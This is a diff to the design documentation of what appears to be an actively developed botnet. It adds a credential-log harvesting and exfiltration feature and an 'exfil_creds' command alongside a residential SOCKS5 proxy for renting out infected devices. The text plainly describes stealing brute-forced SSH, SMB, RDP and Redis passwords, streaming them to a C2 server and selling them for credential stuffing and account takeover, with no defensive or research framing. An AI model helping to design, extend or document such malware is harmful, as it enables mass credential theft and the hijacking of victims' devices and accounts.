@@ -124,13 +124,15 @@ placeholder is rejected.
    - Produce the bundle with `make dist-src` (prints the pin to set).
    - Enabled with `payload_compile_enabled=1`.
 
-## Monetization (Residential SOCKS5 Proxy)
+## Monetization (Residential SOCKS5 Proxy + Credential Logs)
 
 The bot monetizes its **network position** rather than its compute — the
 spiritual successor to mining and the pattern that drove **911 S5 to 19
 million infected devices before its 2024 takedown** (ZeroAccess's successor).
 Renting the bot's residential IP as an egress proxy has better margins and
 far lower noise than cryptomining.
+
+### Residential proxy
 
 When enabled, the bot runs a **SOCKS5 forward proxy** (RFC 1928) that accepts
 CONNECT requests and forwards them to any IPv4 or domain destination. A
@@ -151,6 +153,32 @@ C2 aggregates heartbeat proxy status into a **residential-proxy inventory**.
 - **Heartbeat** reports `proxy_on` + `proxy_port` so the C2 can build the
   inventory.
 
+### Credential-log collection (smash-and-grab log-sale)
+
+2026 judgment: per-victim monetization (MitB banking fraud, click fraud) lost
+to fraud analytics and MFA — **the market rewarded speed instead: steal
+everything, sell the log, let the buyer monetize.** Credential-log sales are
+the direct descendant of Zeus-era theft, now smash-and-grab (the Vidar /
+RedLine / Lumma-stealer MaaS model).
+
+- **Harvest.** Every successful brute-force credential (SSH, Telnet, SMB,
+  Redis `AUTH`, RDP) is buffered in a bounded, mutex-protected queue — one
+  line per entry, `proto|ip|port|user|pass`. Redis's unauthenticated exploit
+  records nothing (there is no credential to sell); the verified `AUTH`
+  password is what gets logged.
+- **Bounded + DROP-NEWEST.** The buffer is a fixed 256×256 array that never
+  grows; when full, a fresh credential is discarded with a `log_warn` rather
+  than evicting older (as-yet-unexfiltrated) harvest.
+- **Exfil.** `exfil_creds` streams the whole log to the C2 in chunks (same
+  chunking path as `exfil`) then clears the buffer, so capacity resets for
+  the next harvest. The command is gated by the same shared-secret C2 auth as
+  every other command.
+- **Inventory.** Heartbeat reports `cred_count` so the C2 tracks how much
+  log it can sell at any moment.
+- **Sell the log.** The C2 operator aggregates per-bot harvests into a
+  combined log (service, host, username, password) and sells it; the buyer
+  monetizes via credential stuffing / account takeover / access resale.
+
 ## Commands
 
 Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
@@ -164,12 +192,13 @@ shared secret). The command queue is rate-limited to 10 commands/second.
 | download | `download <url> [path]` | Implemented — fetch URL to a local path |
 | upload  | `upload <path> [remote_path]` | Implemented — upload a file to the C2 |
 | exfil   | `exfil <path>` | Implemented — read a file and stream it to the C2 in chunks |
+| exfil_creds | `exfil_creds` | Implemented — stream the buffered credential-log harvest (successful brute-force creds) to the C2 in chunks, then clear the buffer |
 | update  | `update [url]` | Implemented — download + SHA-256 verify + install new binary |
 | reboot  | `reboot` | Implemented — sync + reboot the target |
 | sleep   | `sleep <seconds>` | Implemented — set scan interval (clamped 1–3600) |
 | config_set | `config_set <key>=<value>` | Implemented — allowlisted runtime config keys |
 | proxy   | `proxy on [port]` / `proxy off` | Implemented — start/stop the residential SOCKS5 forward proxy (requires `proxy_token`) |
-| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, proxy status |
+| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, credential-log count, proxy status |
 
 ## Configuration
 
